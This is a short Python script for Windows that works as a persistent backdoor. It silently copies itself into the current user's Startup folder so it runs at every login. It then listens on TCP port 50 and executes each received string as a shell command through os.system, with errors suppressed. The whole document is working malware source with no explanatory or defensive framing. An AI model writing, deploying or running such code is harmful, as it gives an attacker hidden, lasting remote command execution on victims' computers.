import socket
from os import *
import getpass

try:
    filename = path.basename(__file__)
    hostname = getpass.getuser()
    system(f'copy {filename} "C:/Users/{hostname}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"')
except:
    pass



HOST = socket.gethostbyname(socket.gethostname())
PORT = 50

print(f"Setting up server on {HOST}:{PORT}")
print("")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        while True:
            try:
                data = conn.recv(1024).decode('utf-8')
                if data:
                    print(f"{data}")
                    system(data)
            except:
                pass
